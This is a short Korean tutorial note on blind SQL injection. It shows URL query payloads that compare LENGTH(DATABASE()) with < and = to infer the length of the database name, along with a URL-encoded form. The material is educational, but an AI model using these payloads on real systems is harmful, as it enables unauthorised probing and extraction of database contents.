### 데이터베이스 이름 길이 추출

```sql
#길이 확인 - >,<로 대략적인 크기 유추 가능
URLQuery AND LENGTH(DATABASE()) < 5
#원본 형태
URLQuery AND LENGTH(DATABASE()) = 5
#URL 인코딩 후
URLQuery+AND+LENGTH(DATABASE())+%3D+5
```

- URL에 SQL 쿼리문이 존재하여 SQL Injection 시도
- 연산자에 부등호(<,>)를 이용하여 대략적인 데이터베이스 이름명의 길이를 유추 가능
